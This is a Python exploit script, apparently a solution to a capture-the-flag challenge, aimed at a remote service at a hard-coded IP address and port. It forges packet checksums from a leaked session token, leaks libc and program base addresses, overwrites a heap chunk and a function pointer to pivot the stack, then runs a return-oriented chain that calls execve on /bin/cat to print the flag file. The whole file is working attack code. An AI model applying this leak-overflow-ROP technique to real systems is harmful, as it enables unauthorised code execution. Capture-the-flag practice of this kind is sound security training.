#!/usr/bin/env python3
"""Pivot + execve(\"/bin/cat\", argv, NULL) — no /bin/sh needed."""
import socket, struct, re, sys

HOST, PORT = "144.79.188.39", 37082
C = 0x5A5A5A5A41414141
PUTS_OFF = 0x83CC0
POP_RDI = 0x26542
POP_RSI = 0x26F9E
POP_RDX = 0x12BDA6
EXECVE = 0xE1950
CAT = b"/bin/cat\x00"
FLAGPATH = b"/home/ctf/flag.txt\x00"


def rd(s, t=1.2):
    s.settimeout(t)
    buf = b""
    try:
        while True:
            d = s.recv(4096)
            if not d:
                break
            buf += d
    except socket.timeout:
        pass
    return buf


def checksum(ptype, plen, payload, token):
    x = ((((ptype << 24) & 0xFFFFFFFF) ^ token) & 0xFFFFFFFF) ^ plen
    x ^= 0x31415926
    x &= 0xFFFFFFFF
    for i in range(plen):
        x = ((x << 5) | (x >> 27)) & 0xFFFFFFFF
        x = (x + ((i * 0x45D9F3B) ^ payload[i])) & 0xFFFFFFFF
    return x & 0xFFFFFFFF


def send_packet(s, ptype, payload, token):
    plen = len(payload)
    ck = checksum(ptype, plen, payload, token)
    s.sendall(f"{ptype}\n{plen}\n{ck:x}\n".encode() + payload)


def main(flagpath=FLAGPATH):
    s = socket.create_connection((HOST, PORT), timeout=8)
    banner = rd(s, 2.0)
    token = int(re.search(rb"session token: ([0-9a-f]{8})", banner).group(1), 16)
    tok12 = (token & 0xFFFFFFFF) << 12

    def pkt(pt, pl, t=1.2):
        send_packet(s, pt, pl, token)
        return rd(s, t)

    pkt(2, struct.pack("<I", (token ^ 0xC0FFEE00) & 0xFFFFFFFF))
    pkt(3, struct.pack("<H", 0x80) + b"A" * 0x80)
    pkt(4, b"Z")
    puts = (int(re.search(rb"0x([0-9a-f]+)", pkt(4, b"P")).group(1), 16) ^ C ^ tok12) & 0xFFFFFFFFFFFFFFFF
    report = (int(re.search(rb"0x([0-9a-f]+)", pkt(4, b"R")).group(1), 16) ^ C ^ tok12) & 0xFFFFFFFFFFFFFFFF
    fp0 = (int(re.search(rb"0x([0-9a-f]+)", pkt(4, b"D")).group(1), 16) ^ C ^ tok12) & 0xFFFFFFFFFFFFFFFF
    libc = puts - PUTS_OFF
    pie = fp0 - 0x157F
    print(f"[+] libc {hex(libc)} pie {hex(pie)} report {hex(report)}", flush=True)

    rlen = 0x200
    ov = bytearray(rlen)
    # strings at report+0 / report+0x10
    ov[0xB0 : 0xB0 + len(CAT)] = CAT
    ov[0xC0 : 0xC0 + len(flagpath)] = flagpath
    # argv at report+0x80 = slot+0x130
    argv = report + 0x80
    struct.pack_into("<QQQ", ov, 0x130, report, report + 0x10, 0)
    # restore a plausible next-chunk header
    struct.pack_into("<Q", ov, 0xA0, 0)
    struct.pack_into("<Q", ov, 0xA8, 0x131)
    # fp = stack pivot lea rsp,[rdi+0x28]; ret
    struct.pack_into("<Q", ov, 0xD0, pie + 0x15E2)
    # ROP at report+0x28 = slot+0xD8
    struct.pack_into("<Q", ov, 0xD8, libc + POP_RDI)
    struct.pack_into("<Q", ov, 0xE0, report)  # /bin/cat
    struct.pack_into("<Q", ov, 0xE8, libc + POP_RSI)
    struct.pack_into("<Q", ov, 0xF0, argv)
    struct.pack_into("<Q", ov, 0xF8, libc + POP_RDX)
    struct.pack_into("<Q", ov, 0x100, 0)
    struct.pack_into("<Q", ov, 0x108, libc + EXECVE)

    pkt(3, struct.pack("<H", rlen) + bytes(ov))
    r = pkt(4, b"D")
    fp2 = (int(re.search(rb"0x([0-9a-f]+)", r).group(1), 16) ^ C ^ tok12) & 0xFFFFFFFFFFFFFFFF
    print(f"[+] fp2 {hex(fp2)} pivot {hex(pie+0x15E2)}", flush=True)
    out = pkt(5, b"", t=5.0)
    s.close()
    sys.stdout.buffer.write(b"ANALYZE " + out + b"\n")
    sys.stdout.buffer.flush()
    m = re.search(rb"PTITCTF\{[^}]+\}", out)
    if m:
        print("FLAG", m.group(0).decode(), flush=True)


if __name__ == "__main__":
    if len(sys.argv) > 1:
        FLAGPATH = sys.argv[1].encode() + b"\x00"
    main(FLAGPATH)
